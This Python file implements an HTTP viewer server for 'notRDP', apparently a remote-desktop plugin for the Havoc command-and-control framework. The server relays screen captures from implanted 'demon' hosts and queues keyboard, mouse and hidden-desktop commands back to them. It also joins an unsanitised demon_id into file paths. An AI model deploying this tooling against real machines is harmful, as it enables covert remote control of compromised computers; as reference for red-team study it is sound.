"""
_viewer_server.py - HTTP viewer server for notRDP

Runs as a separate process launched by the Havoc plugin.
Reads frame JPEGs and input commands via a shared temp directory.
Supports long-polling for near-instant frame delivery.

Author:  Dhanush Arvind
"""

import json
import os
import sys
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

_shared_dir = ""
_viewer_html = ""


class ViewerHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        if self.path == "/" or self.path == "/index.html":
            try:
                with open(_viewer_html, "rb") as f:
                    self._respond(200, "text/html", f.read())
            except FileNotFoundError:
                self._respond(404, "text/plain", b"viewer.html not found")
            return

        if self.path == "/api/demons":
            demons = []
            demons_file = os.path.join(_shared_dir, "demons.json")
            try:
                with open(demons_file, "r") as f:
                    demons = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError):
                pass
            self._respond(200, "application/json", json.dumps(demons).encode())
            return

        if self.path.startswith("/api/frame/"):
            self._handle_frame()
            return

        if self.path == "/bg.png":
            bg_path = os.path.join(_shared_dir, "bg.png")
            try:
                with open(bg_path, "rb") as f:
                    self._respond(200, "image/png", f.read())
            except FileNotFoundError:
                self._respond(404, "text/plain", b"Not found")
            return

        if self.path == "/api/status":
            self._respond(200, "application/json",
                          json.dumps({"server": "running"}).encode())
            return

        self._respond(404, "text/plain", b"Not found")

    def _handle_frame(self):
        raw = self.path.split("/api/frame/", 1)[1]
        parts = raw.split("?", 1)
        demon_id = parts[0]

        after_mtime = None
        if len(parts) > 1:
            for param in parts[1].split("&"):
                if param.startswith("after="):
                    try:
                        after_mtime = float(param[6:])
                    except ValueError:
                        pass

        frame_path = os.path.join(_shared_dir, demon_id + ".jpg")

        if after_mtime is not None:
            deadline = time.monotonic() + 2.0
            while time.monotonic() < deadline:
                try:
                    mtime = os.path.getmtime(frame_path)
                    if mtime > after_mtime:
                        self._send_frame(frame_path, mtime)
                        return
                except FileNotFoundError:
                    pass
                time.sleep(0.02)
            self.send_response(304)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            return

        try:
            mtime = os.path.getmtime(frame_path)
            self._send_frame(frame_path, mtime)
        except FileNotFoundError:
            self._respond(404, "text/plain", b"No frame available")

    def _send_frame(self, frame_path, mtime):
        try:
            with open(frame_path, "rb") as f:
                frame = f.read()
        except (FileNotFoundError, OSError):
            self._respond(404, "text/plain", b"No frame available")
            return

        if not frame:
            self._respond(404, "text/plain", b"No frame available")
            return

        self.send_response(200)
        self.send_header("Content-Type", "image/jpeg")
        self.send_header("Cache-Control", "no-cache")
        self.send_header("Content-Length", str(len(frame)))
        self.send_header("X-Frame-Time", str(mtime))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Expose-Headers", "X-Frame-Time")
        self.end_headers()
        self.wfile.write(frame)

    def do_POST(self):
        if self.path == "/api/input":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length) if length else b""
            try:
                data = json.loads(body)
                demon_id = data.get("demon_id", "unknown")
                input_file = os.path.join(_shared_dir, demon_id + "_input.json")
                pending = []
                try:
                    with open(input_file, "r") as f:
                        pending = json.load(f)
                except (FileNotFoundError, json.JSONDecodeError):
                    pass
                pending.append(data)
                with open(input_file, "w") as f:
                    json.dump(pending, f)
                self._respond(200, "application/json", b'{"ok":true}')
            except Exception as e:
                self._respond(500, "application/json",
                              json.dumps({"error": str(e)}).encode())
            return

        if self.path == "/api/hdesktop" or self.path == "/api/notrdp":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length) if length else b""
            try:
                data = json.loads(body)
                demon_id = data.get("demon_id", "unknown")
                hd_file = os.path.join(_shared_dir, demon_id + "_notrdp.json")
                pending = []
                try:
                    with open(hd_file, "r") as f:
                        pending = json.load(f)
                except (FileNotFoundError, json.JSONDecodeError):
                    pass
                pending.append(data)
                with open(hd_file, "w") as f:
                    json.dump(pending, f)
                self._respond(200, "application/json", b'{"ok":true}')
            except Exception as e:
                self._respond(500, "application/json",
                              json.dumps({"error": str(e)}).encode())
            return

        self._respond(404, "text/plain", b"Not found")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _respond(self, code, ctype, body):
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        if isinstance(body, str):
            body = body.encode()
        self.wfile.write(body)


def main():
    if len(sys.argv) < 4:
        print("Usage: %s <port> <shared_dir> <viewer_html>" % sys.argv[0])
        sys.exit(1)

    global _shared_dir, _viewer_html
    port = int(sys.argv[1])
    _shared_dir = sys.argv[2]
    _viewer_html = sys.argv[3]

    os.makedirs(_shared_dir, exist_ok=True)

    pid_file = os.path.join(_shared_dir, "server.pid")
    with open(pid_file, "w") as f:
        f.write(str(os.getpid()))

    srv = ThreadingHTTPServer(("0.0.0.0", port), ViewerHandler)
    srv.daemon_threads = True
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        srv.shutdown()


if __name__ == "__main__":
    main()
